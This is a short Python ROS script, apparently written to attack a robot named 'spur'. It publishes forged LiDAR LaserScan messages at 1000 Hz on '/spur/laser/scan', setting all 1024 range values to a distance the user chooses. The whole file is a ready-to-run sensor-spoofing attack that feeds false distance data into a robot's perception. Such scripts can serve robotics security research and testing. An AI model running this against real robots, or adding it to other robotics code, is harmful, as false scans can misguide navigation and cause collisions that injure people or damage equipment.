#!/usr/bin/env python3
import rospy
from sensor_msgs.msg import LaserScan

laser = LaserScan()

scan_pub = rospy.Publisher('/spur/laser/scan', LaserScan, queue_size = 10)
rospy.init_node('lidar_spoofing')
rate = rospy.Rate(1000)

distance = input("Please enter the distance to be spoofed: ")
print("Execution of the LiDAR spoofing is active. ")

thistuple = ()
y = list(thistuple)

for x in range(1024):
    y.append(float(distance))
thistuple = tuple(y)
laser.ranges = thistuple

try:
    while not rospy.is_shutdown():
        scan_pub.publish(laser)
        rate.sleep()
except KeyboardInterrupt:
    pass
    print("\nSpoofing of the LiDAR Sensor has stopped.")